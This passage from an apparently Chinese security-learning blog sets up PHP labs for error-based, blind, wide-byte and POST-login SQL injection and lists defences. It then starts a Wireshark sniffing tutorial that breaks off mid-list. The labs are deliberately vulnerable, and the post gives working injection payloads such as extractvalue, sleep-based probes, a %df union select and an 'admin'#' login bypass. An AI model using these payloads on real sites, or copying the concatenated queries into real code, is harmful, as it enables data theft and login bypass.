class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL报错注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in ...&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>对应页面如下：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306232515661.png"></p><p><strong>注入语句：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</span><br></pre></td></tr></table></figure><p><strong>注入结果：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306232739874.png"></p><p><strong>防御措施：</strong></p><p>对输入的参数进行过滤，并取消报错信息显示等。</p><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>盲注指无法利用回显和报错信息等情况，进行的一种sql注入方法。</p><p>盲注主要分为两种：</p><ul><li>布尔盲注：通过判断页面响应情况判断是否存在注入点。</li><li>时间盲注：利用页面加载时间来判断后端数据库是否执行了我们构造的sql语句，本质还是没有对用户输入的参数进行处理，导致了用户可以随意闭合，构造自己需要的sql语句。</li></ul><p><strong>测试代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL盲注环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in ...&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are not in ...&#x27;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>; <span class="comment">// 布尔盲注</span></span><br><span class="line">         <span class="comment">//echo &#x27;You are in ...&lt;hr&gt;&#x27;; // 时间盲注</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>布尔盲注对应页面：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306234906381.png"></p><p>添加单引号后不报错，但页面响应不同</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306234936476.png"></p><p>注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1&#39; and length(database())&gt;5--+</span><br><span class="line">&#x2F;?id&#x3D;1&#39; and length(database())&gt;3--+</span><br></pre></td></tr></table></figure><p>注入结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306235533662.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306235615337.png"></p><p>上面结果说明当前数据库名字的长度在3~5之间，以此类推，可得到其他信息。</p><p><strong>时间盲注对应页面：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307084559117.png"></p><p>添加单引号后不报错，且页面响应相同</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307084635657.png"></p><p>注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1&#39; and if(1&#x3D;0,1,sleep(5))--+</span><br><span class="line">&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;4,sleep(5),1)--+</span><br><span class="line">&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;116,sleep(5),1)--+</span><br></pre></td></tr></table></figure><p>注入结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307090147625.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307090340750.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307091305473.png"></p><p><strong>防御措施：</strong></p><p>对输入的参数进行过滤等。</p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>当mysql数据库采用GBK编码时可能存在宽字节注入。</p><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围），而当我们输入有单引号时会自动加入\进行转义而变为\’（在PHP配置文件中magic_quotes_gpc=On的情况下或者使用addslashes函数，icov函数，mysql_real_escape_string函数、mysql_escape_string函数等，提交的参数中如果带有单引号’，就会被自动转义\’，使得多数注入攻击无效），由于宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，将后面的一个字节与前一个大于128的ascii码进行组合成为一个完整的字符，此时’前的\就被吃了，我们就可以使用’了，利用这个特性从而可实施SQL注入的利用。最常使用的宽字节注入是利用%df，其实我们只要第一个ascii码大于128就可以了，比如ascii码为129的就可以，即为%81。</p><p>参考文章：<a href="https://blog.51cto.com/eth10/1962804">浅谈对宽字节注入的认识</a></p><p><strong>测试代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL宽字节注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置GBK编码</span></span><br><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&#x27;set names gbk&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="comment">// addslashes()函数，在预定义符号前添加反斜杠</span></span><br><span class="line">    <span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line">    <span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your username：&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your password：&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>对应页面如下：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307105837231.png"></p><p><strong>注入语句：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;-1%df&#39; union select 1,(select @@datadir),(select @@version_compile_os)--+</span><br></pre></td></tr></table></figure><p><strong>注入结果：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307110636955.png"></p><p><strong>防御措施：</strong></p><p>设置MySQL的字符集为 UTF-8。</p><h1 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h1><p>当对以POST方式提交的参数无任何的过滤，直接拼接用户名和密码来从数据库中直接查询结果并实现登录等情况，可直接构造一个sql语句越过密码的确认，也就是俗称的万能密码<code>admin&#39; --+</code>或<code>admin&#39;#</code></p><p><strong>测试代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;SQL注入测试&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;./sql_login.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">用户名:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">密码：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span>=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line">        <span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;连接MySQL发生错误:&#x27;</span>.mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 选择库</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"><span class="comment">// 设置utf-8编码</span></span><br><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&#x27;set names utf-8&#x27;</span>);</span><br><span class="line">        <span class="comment">// 取消报错显示</span></span><br><span class="line">        error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 接收参数</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">// 拼接sql语句并执行</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM user WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>=mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>))&#123;</span><br><span class="line">    <span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>] . <span class="string">&quot;，您已登录成功！&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登录失败，用户名或密码错误！&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;（请输入正确的用户名和密码进行登录）&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;SQL拼接结果：&#x27;</span>.<span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>对应页面如下：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307173151304.png" alt="image-20210307173151304"></p><p><strong>构造万能密码登录：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307120812568.png"></p><p><strong>以其他方式进行注入：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307121042343.png"></p><h1 id="注入漏洞的防御"><a href="#注入漏洞的防御" class="headerlink" title="注入漏洞的防御"></a>注入漏洞的防御</h1><p><strong>代码方向</strong></p><ol><li>对用户输入数据进行转义，例如<code>addslashes()</code> 函数在指定的预定义字符前添加反斜杠，把<code>&#39;</code>转义为<code>\&#39; </code></li><li>对特定的关键词进行匹配过滤。如可以检测<code>select</code>、<code>from</code>、<code>union</code>等关键词，将其过滤。</li><li>对数据类型及数据长度进行严格限定，防止用户输入过多的无用数据。</li><li>采用sql语句预编译，SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面无论输入的是什么，都不会影响该sql语句的 语法结构。</li><li>使用正则表达式过滤传入的参数。</li></ol><p><strong>服务器方向</strong></p><ol><li>对数据库采用最小权限分配，如普通用户与系统管理员用户的权限进行严格的区分，这样即使可以拿到权限也不会造成更大的损失。</li><li>避免显示SQL执行报错的信息，防止报错信息被利用。</li><li>数据层的编码统一，防止过滤模型被绕过。</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p>[1] <a href="https://www.cnblogs.com/wangyuyang1016/p/12172026.html">常见的sql注入环境搭建</a></p><p>[2] <a href="https://bu1.github.io/2021/01/06/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%91%A8%EF%BC%9A%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%89%8D%E7%BC%96%E5%86%99%E7%9A%84%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83/">第十一周：手工测试之前编写的注入环境</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全学习 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark抓包体验</title>
      <link href="posts/31686.html"/>
      <url>posts/31686.html</url>
      
        <content type="html"><![CDATA[<h1 id="嗅探器原理"><a href="#嗅探器原理" class="headerlink" title="嗅探器原理"></a>嗅探器原理</h1><p>嗅探技术是网络安全攻防技术中很重要的一种，通过它可以获取网络中的大量信息。与主动扫描相比，嗅探更难以被察觉，能够对网络中的活动进行实时监控。</p><p>网络嗅探器实际上就是网络中的窃听器，其用途就是捕获分析网络中的数据包，帮助网络管理员发现入侵、分析网络问题等等，它是能够进行嗅探的软件或硬件设备。通过嗅探得到二进制的数据包后，对这些数据包进行解析和理解，获得协议字段与传输的数据的过程就是网络协议分析。所以说，网络嗅探与网络协议分析联系紧密。</p><p>对于攻击者来说，通过网络嗅探，进行协议分析，能够窃取内部机密，搜集信息。而对于管理员来说，网络嗅探可以实现网络流量情况的监听，定位网络故障，并且能够为网络入侵检测提供底层的数据来源。</p><p>网络嗅探的关键在于以太网的通信机制和网卡的工作模式。迄今为止，以太网仍然是最普遍的组网方法之一，而以太网的共享特性决定了嗅探能够成功。由于以太网是基于广播方式传送数据，因此网络中所有的数据信号都会被传送到每一个主机节点，这样每一台机器实际上都能接受到数据帧。一个网络接口使用网卡的接收模式有以下几种：</p><ul><li>广播模式（Broadcast Mode）：该模式下的网卡能够接收网络中所有类型为广播报文的数据帧。</li><li>组播模式（Multicast Mode）：该模式下的网卡能够接受特定的组播数据。</li><li>直接模式（Unicast Mode）：该模式下的网卡在工作时只接收目的地址匹配本机MAC地址的数据帧。</li><li>混杂模式（Promiscuous Mode）：在这种模式下，网卡对数据帧中的目的MAC地址不加任何检查，全部接收。</li></ul><p>因此只要将网卡的工作模式设置为“混杂模式”，网卡将会接受所有传递给他的数据包，从而实现嗅探。嗅探得到结果后，再进行网络协议分析，根据网络协议分析的粒度可以分为三种：针对原始数据包进行分析，层次最低、最细粒度；对网络流（会话）进行分析，通过5元组进行流（会话）；以及网络流高层统计。针对网络报文分析的工具，常用的有集成工具WireShark，网络流重组工具Nstreams、Snort，进行高层统计和摘要分析的Netflow、RRDTools等等。</p><h1 id="Wireshark简介"><a href="#Wireshark简介" class="headerlink" title="Wireshark简介"></a>Wireshark简介</h1><blockquote><p>作为一款高效免费的抓包工具，wireshark可以截取各种网络封包，显示网络封包的详细信息，其最大的优势就是免费、开源以及多平台支持，如今其已是全球最广泛的网络数据包分析软件之一。</p></blockquote><p>Wireshark不可以做什么？</p><p>Wireshark只能查看封包，而不能修改封包的内容，或者发送封包。且对于网络上的异常流量行为，Wireshark不会产生警示或是任何提示。</p><h1 id="Wireshark使用"><a href="#Wireshark使用" class="headerlink" title="Wireshark使用"></a>Wireshark使用</h1><p>Wireshark安装</p><p>前往<a href="https://www.wireshark.org/download.html">Wireshark官网</a>进行下载，下载完成后一路next安装即可。</p><p>（1）打开wireshark，主界面如下图所示。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304001621502.png" alt="image-20210304001621502"></p><p>（2）利用wireshark开始抓包。选择菜单栏上捕获——&gt;选项，只勾选WLAN的混杂模式，点击开始(也可以直接双击上图的WLAN开始)。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304001701812.png" alt="image-20210304001701812"></p><p>（3）查看抓包情况（此时wireshark正不停地捕获WLAN下传输的数据包）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304001722007.png" alt="image-20210304001722007"></p><p>（4）数据包详细信息</p><p>​    各行信息分别为</p><ul><li>Frame：物理层的数据帧概况</li><li>Ethernet II： 数据链路层以太网帧头部信息</li><li>Internet Protocol Version 4: 网络层IP包头部信息</li><li>Transmission Control Protocol：传输层的数据段头部信息</li><li>Hypertext Transfer Protocol: 应用层的信息，此处是HTTP协议</li></ul><p>wireshark与对应的OSI七层模型</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304001821297.png" alt="image-20210304001821297"></p><p>wireshark捕获到的TCP包中的每个字段内容</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304001914848.png" alt="image-20210304001914848"></p><p>（5）wireshark过滤器</p><p>直接使用WireShark捕获包将会得到大量的冗余信息，在几千甚至几万条记录中很难找到自己需要的部分，因而，使用过滤器十分重要。使用WireShark的过滤器有两种方法：</p><p>第一种是在Capture Filter中按照libpcap过滤器语言设置好过滤条件。此外，我们也可以捕获后过滤。先捕获所有的数据包，然后通过设定显示过滤器，只让Wireshark显示我们想要观察的那些类型的数据包。我们使用WireShark过滤器时，输入规则若是正确的，则过滤器输入框的背景为绿色，否则，背景为红色。</p><p>wireshark过滤器表达式的规则：</p><ul><li>协议过滤</li></ul><p>直接在抓包过滤框中直接输入协议名即可。tcp，只显示TCP协议的数据包列表；http，只查看HTTP协议的数据包列表；icmp，只显示ICMP协议的数据包列表</p><ul><li>IP过滤</li></ul><p>ip.src == 192.168.1.102，显示源地址为192.168.1.102的数据包</p><p>ip.dst == 192.168.1.102，显示目标地址为192.168.1.102的数据包</p><p>ip.addr == 192.168.1.102，显示源IP地址或目标IP地址为192.168.1.102的数据包</p><ul><li>端口过滤</li></ul><p>tcp.port == 80，显示tcp协议的源主机或者目的主机端口为80的数据包</p><p>tcp.srcport == 80，显示TCP协议的源主机端口为80的数据包</p><p>tcp.dstport == 